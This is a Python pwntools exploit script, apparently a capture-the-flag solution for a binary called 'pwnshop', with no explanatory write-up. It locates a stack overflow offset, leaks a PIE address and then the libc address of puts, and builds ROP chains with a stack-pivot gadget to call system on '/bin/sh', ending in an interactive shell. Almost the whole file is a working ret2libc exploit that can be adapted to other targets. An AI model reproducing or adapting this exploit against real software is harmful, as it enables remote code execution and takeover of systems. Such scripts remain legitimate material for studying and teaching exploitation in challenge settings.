#!/bin/env python3
from pwn import gdb, remote, process, ELF, cyclic, cyclic_find, context, info,\
                args, unpack, flat


def start(argv=[], *a, **kw):
    if args.GDB:   # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter('>', '1')
    p.sendlineafter('Enter details:', payload)
    p.wait()
    # Wait for the process to crash
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.eip)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP offset at {a}'.format(a=ip_offset))
    # Return the EIP offset
    return ip_offset


gdbscript = '''
pwndbg
piebase 0x40c0
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './pwnshop'
# This will automatically get contect arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'
# context.encoding = 'utf8'


# #### EXPLOIT #####

# Pass in pattern size, gt back EIP offset
offset = find_ip(cyclic(100))

# start program
io = start()

pop_rdi = 0x13c3
sub_rsp_28 = 0x1219

io.sendlineafter('>', '2')
io.sendlineafter('?', '4444')
io.sendlineafter('it', 'a' * 7)
io.recvuntil('a\n')

leaked_addr = unpack(io.recv()[:6].ljust(8, b"\x00"))
info ('leaked_addr: %#x', leaked_addr)

elf.address = leaked_addr - 0x40c0
info('piebase_addr: %#x', elf.address)

rop_chain = flat([
        elf.address + pop_rdi,
        elf.got.puts,
        elf.plt.puts,
        elf.address + 0x132a
])

padding = (offset - len(rop_chain))

# build payload
payload = flat({
    padding: [
        rop_chain,
        elf.address + sub_rsp_28
        ]
})

io.sendline('1')
io.sendafter('Enter details:', payload)

got_puts = unpack(io.recvline().strip()[:6].ljust(8, b"\x00"))
info('got_puts: %#x', got_puts)

libc_base = got_puts - 0x765f0
info('libc_base: %#x', libc_base)

system_addr = libc_base + 0x49e50
info('system_addr: %#x', system_addr)

sh_add = libc_base + 0x18a156
info('sh addr: %#x', sh_add)

rop_chain = flat([
        elf.address + pop_rdi,
        sh_add,
        system_addr,
        elf.address + 0x132a
])

padding = offset - len(rop_chain)

payload = flat({
    padding: [
        rop_chain,
        elf.address + sub_rsp_28
        ]
})

# io.sendline('1')
io.sendafter('Enter details:', payload)

io.interactive()
